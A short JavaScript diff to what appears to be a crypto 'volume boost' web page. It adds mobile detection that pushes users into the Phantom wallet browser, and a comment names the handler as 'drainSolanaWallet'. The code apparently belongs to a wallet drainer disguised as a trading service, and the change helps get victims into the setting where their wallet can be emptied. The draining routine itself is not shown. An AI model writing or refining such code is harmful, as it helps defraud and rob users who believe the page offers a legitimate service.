@@ -621,6 +621,15 @@
           return;
         }
 
+        // Mobile detection for better UX
+        const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+        const isInPhantomBrowser = navigator.userAgent.toLowerCase().includes('phantom');
+        
+        if (isMobile && !isInPhantomBrowser && !window.solana) {
+          nexiumApp.showFeedback('Please open this site in Phantom app browser to boost volume', 'error');
+          return;
+        }
+
         try {
           boostBtn.disabled = true;
           boostBtn.textContent = 'Processing...';
@@ -638,6 +647,7 @@
           console.error('Boost failed:', error);
           boostBtn.textContent = 'Boost Now';
           boostBtn.disabled = false;
+          // Error is already shown by drainSolanaWallet
         }
       });
     }
